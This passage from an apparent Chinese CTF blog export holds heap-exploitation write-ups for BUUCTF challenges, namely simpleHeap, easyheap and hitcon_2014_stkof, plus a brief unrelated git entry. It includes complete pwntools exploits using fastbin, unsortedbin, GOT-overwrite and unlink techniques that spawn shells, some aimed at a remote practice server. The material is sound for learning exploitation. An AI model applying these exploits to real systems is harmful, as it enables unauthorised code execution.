<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p=process(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line"><span class="comment">#p=remote('node3.buuoj.cn',26521)</span></span><br><span class="line">elf=ELF(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'size?'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx?'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx?'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx?'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'pppp'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'pppp'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'pppp'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'pppp'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake chunk</span></span><br><span class="line">payload=<span class="string">'p'</span>*<span class="number">0x18</span>+<span class="string">'\xe1'</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'pppp'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">main_arena=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-88</span></span><br><span class="line">libc_base=main_arena<span class="number">-0x3c4b20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_one_gadget=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget=libc_base+libc_one_gadget[<span class="number">1</span>]</span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc=libc_base+libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">fake_chunk=malloc_hook<span class="number">-0x23</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"[*]libc_base"</span>+hex(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'pppp'</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(fake_chunk)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'pppp'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'p'</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(realloc+<span class="number">13</span>)</span><br><span class="line">add(<span class="number">0x60</span>,payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size?'</span>)</span><br><span class="line">p.sendline(<span class="string">"12"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>不知道为什么本地打不通，但是远程莫得问题</p>
<h2 id="1-easyheap"><a href="#1-easyheap" class="headerlink" title="-1.easyheap"></a>-1.easyheap</h2><h3 id="前期保护"><a href="#前期保护" class="headerlink" title="前期保护"></a>前期保护</h3><p><img src="/2020/11/20/16-35/image-20201120173551508.png" alt="image-20201120173551508"></p>
<p>64位的，没有开pie和relro，顿时觉得easy</p>
<p>没开pie，可以用elf里的plt和got表，没开relro，可以覆盖got表地址。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><img src="/2020/11/20/16-35/image-20201120173920525.png" alt="image-20201120173920525"></p>
<p>edit里面可以输入长度，造成堆溢出</p>
<p><img src="/2020/11/20/16-35/image-20201120174112398.png" alt="image-20201120174112398"></p>
<p>程序留有后面函数，，</p>
<p><img src="/2020/11/20/16-35/image-20201120174142786.png" alt="image-20201120174142786"></p>
<p>只要v3 == 4869，也就是选择输入的时候输入4869即可。并且让magic大于0x1305可以，unsortedbin可以实现向任意地址读入</p>
<h3 id="方法一-unsortbin-attack"><a href="#方法一-unsortbin-attack" class="headerlink" title="方法一 unsortbin attack"></a>方法一 unsortbin attack</h3><p>首先申请了三个堆块，其中第二个要大于0x70为unsortbin</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x20,&#39;aaaa&#39;)</span><br><span class="line">add(0x80,&#39;aaaa&#39;)</span><br><span class="line">add(0x20,&#39;aaaa&#39;)</span><br></pre></td></tr></table></figure>
<p>然后将第二个释放，放入unsortbin中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete(1)</span><br></pre></td></tr></table></figure>
<p>利用堆溢出，将unsortbin内容修改，其中fd为任意，bk为目标地址 - 0x10</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fd &#x3D; 0</span><br><span class="line">bk &#x3D; magic - 0x10</span><br><span class="line">edit(0,0x20+0x20,&quot;a&quot;*0x20+p64(0)+p64(0x91)+p64(fd)+p64(bk))</span><br></pre></td></tr></table></figure>
<p>接着，把我们的unsortbin申请回来，实现unsortbin attack</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x80,&#39;aaaa&#39;)</span><br></pre></td></tr></table></figure>
<p>然后，v3输入4869，此时magic已经是一个很大的数，就可以进入后面函数了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p.recvuntil(&quot;Your choice :&quot;)</span><br><span class="line">p.sendline(&quot;4869&quot;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./easyheap")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="string">"28942"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Size of Heap : "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content of heap:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Size of Heap : "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content of heap : "</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x06020C0</span></span><br><span class="line"></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bk = magic - <span class="number">0x10</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>+<span class="number">0x20</span>,<span class="string">"a"</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(fd)+p64(bk))</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">p.sendline(<span class="string">"4869"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/20/16-35/image-20201120175326957.png" alt="image-20201120175326957"></p>
<p>远程有点问题，，，所以要非预期解了。。。</p>
<h3 id="方法二-fastbin修改got表"><a href="#方法二-fastbin修改got表" class="headerlink" title="方法二 fastbin修改got表"></a>方法二 fastbin修改got表</h3><p>因为后面要申请到的是0x7f，所以刚开始创建0x68的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x68,&#39;aaaa&#39;)#0</span><br><span class="line">add(0x68,&#39;aaaa&#39;)#1</span><br><span class="line">add(0x68,&#39;aaaa&#39;)#2</span><br></pre></td></tr></table></figure>
<p>然后释放掉一个块，用上一块块溢出到下一个块，将fd里面填入heaparray[i]附近的内容，再申请回来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x60+p64(0)+p64(0x71)+p64(0x6020ad)</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line"></span><br><span class="line">add(0x68,&#39;aaaa&#39;)#1</span><br></pre></td></tr></table></figure>
<p>往申请回来的块里面填入atoi的got表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D; &#39;b&#39;*35 + p64(elf.got[&#39;atoi&#39;])</span><br><span class="line">add(0x68,payload)</span><br></pre></td></tr></table></figure>
<p>然后往got表里面填入system的plt表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D; p64(elf.plt[&#39;system&#39;])</span><br><span class="line">edit(0,0x8,payload)</span><br></pre></td></tr></table></figure>
<p>然后发送的时候，发送’/bin/sh’，即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p.recvuntil(&quot;Your choice :&quot;)</span><br><span class="line">p.sendline(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./easyheap"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./easyheap"</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="string">"28942"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Size of Heap : "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content of heap:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Size of Heap : "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content of heap : "</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x60</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(<span class="number">0x6020ad</span>)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'b'</span>*<span class="number">35</span> + p64(elf.got[<span class="string">'atoi'</span>])</span><br><span class="line">add(<span class="number">0x68</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(elf.plt[<span class="string">'system'</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>buu</category>
      </categories>
      <tags>
        <tag>buu刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>git</title>
    <url>/2021/01/30/11-16/</url>
    <content><![CDATA[<h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><h3 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h3><p>开源的分布式<strong>版本控制</strong>系统</p>
<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol>
<li>是分布式的</li>
<li>内容按原数据方式存储</li>
<li>没有全局的版本号</li>
<li>内容的完整性（内容存储使用的是 SHA-1 哈希算法）</li>
</ol>
<p><img src="/2021/01/30/11-16/image-20210130111523672.png" alt="image-20210130111523672"></p>
<h2 id="git-常用命令"><a href="#git-常用命令" class="headerlink" title="git 常用命令"></a>git 常用命令</h2><p><img src="/2021/01/30/11-16/gitcommands.jpg" alt="gitcommands"></p>
]]></content>
      <categories>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>hitcon_2014_stkof详解</title>
    <url>/2021/04/20/23-26/</url>
    <content><![CDATA[<blockquote>
<p>本文主要列出hitcon2014_stkof的详细过程</p>
<p>主要参考：<a href="https://bbs.pediy.com/thread-247007.htm" target="_blank" rel="noopener">unlink 系列</a></p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li><p>allocate：分配一个指定size大小的块，返回idx。</p>
<p>其中块的指针信息保存在一个全局变量0x602140中</p>
</li>
<li><p>fill：根据idx找到对应的块，重新给定大小size，读入内容content</p>
</li>
<li><p>free：释放idx的块</p>
</li>
</ol>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ol>
<li>由于fill时候的size可以重新制定，可以造成堆溢出。</li>
<li>没有打印函数</li>
<li>有一个全局变量</li>
</ol>
<p>方法：unlink</p>
<ol>
<li>unlink，控制全局变量内容</li>
<li>修改chunk1指针为free_got，修改got表内容为puts_plt</li>
<li>修改chunk2指针为puts_got，这样，free(2)即可打印puts地址</li>
<li>计算system和binsh</li>
<li>同2，修改got表内容为system，对未使用的chunk4填入‘binsh’</li>
<li>free(4)即可get_shell</li>
</ol>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-tip（setbuf）"><a href="#0-tip（setbuf）" class="headerlink" title="0.tip（setbuf）"></a>0.tip（setbuf）</h4><p>setbuf()/setvbuf()函数作用：关闭I/O缓冲区</p>
<p>一般为了让程序显示正常，会关闭I/O缓冲区</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">setbuf(stdin ,<span class="number">0</span>);</span><br><span class="line">setbuf(stdout,<span class="number">0</span>);</span><br><span class="line">setbuf(stderr,<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>但是本题没有关闭缓冲区，<strong>函数运行开始阶段在fgets()函数以及printf()函数运行的时候，会malloc()两块内存区域</strong>。 </p>
<h4 id="1-保护"><a href="#1-保护" class="headerlink" title="1.保护"></a>1.保护</h4><blockquote>
<p>没开pie，Partial RELRO，可以修改got表内容。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ checksec stkof</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;stkof&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h4 id="2-申请四个块"><a href="#2-申请四个块" class="headerlink" title="2.申请四个块"></a>2.申请四个块</h4><blockquote>
<p>由于为关闭缓冲区，故程序中多出输入缓冲区和输出缓冲区。</p>
<p>第一个chunk，由于会加在输入输出缓冲区之间，后续无用。</p>
<p>第二个chunk，为了unlink前向合并</p>
<p>第三个chunk，大小非fastbin</p>
<p>第四个chunk，一个开始阶段不被改变的chunk，用于最后填入的‘/bin/sh’。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f7000</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8010</span><br><span class="line">Size: 0x31</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8040</span><br><span class="line">Size: 0x411</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8450</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8490</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8520</span><br><span class="line">Size: 0x31</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8550</span><br><span class="line">Size: 0x20ab1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x20f8450</span><br><span class="line">0x20f8450:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x20f8460:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8470:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8480:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8490:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x20f84a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8500:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8520:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x20f8530:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8540:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8550:	0x0000000000000000	0x0000000000020ab1</span><br><span class="line">0x20f8560:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8570:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<blockquote>
<p>全局变量的情况，申请四个chunk的首地址记录在里面。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt;  x&#x2F;30gx 0x602140</span><br><span class="line">0x602140:	0x0000000000000000	0x00000000020f8020</span><br><span class="line">0x602150:	0x00000000020f8460	0x00000000020f84a0</span><br><span class="line">0x602160:	0x00000000020f8530	0x0000000000000000</span><br><span class="line">0x602170:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="3-伪造chunk，unlink前向合并"><a href="#3-伪造chunk，unlink前向合并" class="headerlink" title="3.伪造chunk，unlink前向合并"></a>3.伪造chunk，unlink前向合并</h4><blockquote>
<p>在chunk2中伪造了一个0x20大小的已被释放的chunk，并在chunk3的pre_size中也要填入0x30</p>
<p>通过unlink的固定格式，进行unlink操作，即可使target的地址为target-0x18，网target地址填入数据，即可实现全局变量的控制。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">target &#x3D; 0x602140 + 0x10</span><br><span class="line">fd &#x3D; target - 0x18</span><br><span class="line">bk &#x3D; target - 0x10</span><br></pre></td></tr></table></figure>
<blockquote>
<p>伪造chunk</p>
<ul>
<li>size为0x30，被释放</li>
<li>fd = target - 0x18</li>
<li>bk = target - 0x10</li>
</ul>
<p>修改下一个chunk的pre_size（合并找到伪造的chunk）</p>
<ul>
<li>pre_size = 0x30，当前chunk为0x90</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x20f8450</span><br><span class="line">0x20f8450:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x20f8460:	0x0000000000000000	0x0000000000000030</span><br><span class="line">0x20f8470:	0x0000000000602138	0x0000000000602140</span><br><span class="line">0x20f8480:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x20f8490:	0x0000000000000030	0x0000000000000090</span><br><span class="line">0x20f84a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8500:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8520:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x20f8530:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8540:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8550:	0x0000000000000000	0x0000000000020ab1</span><br><span class="line">0x20f8560:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8570:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<blockquote>
<p>free后造成合并，unlink，在chunk2中填入了target-0x18</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x602140</span><br><span class="line">0x602140:	0x0000000000000000	0x00000000020f8020</span><br><span class="line">0x602150:	0x0000000000602138	0x0000000000000000</span><br><span class="line">0x602160:	0x00000000020f8530	0x0000000000000000</span><br><span class="line">0x602170:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<blockquote>
<p>heap里面看不出来，，，因为地址不对，，，</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f7000</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8010</span><br><span class="line">Size: 0x31</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8040</span><br><span class="line">Size: 0x411</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8450</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x20f8490</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x20f8520</span><br><span class="line">Size: 0x30</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8550</span><br><span class="line">Size: 0x20ab1</span><br></pre></td></tr></table></figure>
<blockquote>
<p>但是已经成功合并释放了，起始地址为伪造的chunk开头</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x20f8460 —▸ 0x7fbcdd959b78 (main_arena+88) ◂— 0x20f8460</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<blockquote>
<p>伪造的chunk大小变为0xc0（0x30+0x90）</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x20f8450</span><br><span class="line">0x20f8450:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x20f8460:	0x0000000000000000	0x00000000000000c1</span><br><span class="line">0x20f8470:	0x00007fbcdd959b78	0x00007fbcdd959b78</span><br><span class="line">0x20f8480:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x20f8490:	0x0000000000000030	0x0000000000000090</span><br><span class="line">0x20f84a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8500:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8520:	0x00000000000000c0	0x0000000000000030</span><br><span class="line">0x20f8530:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8540:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8550:	0x0000000000000000	0x0000000000020ab1</span><br><span class="line">0x20f8560:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8570:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="4-修改全局变量的值"><a href="#4-修改全局变量的值" class="headerlink" title="4. 修改全局变量的值"></a>4. 修改全局变量的值</h4><blockquote>
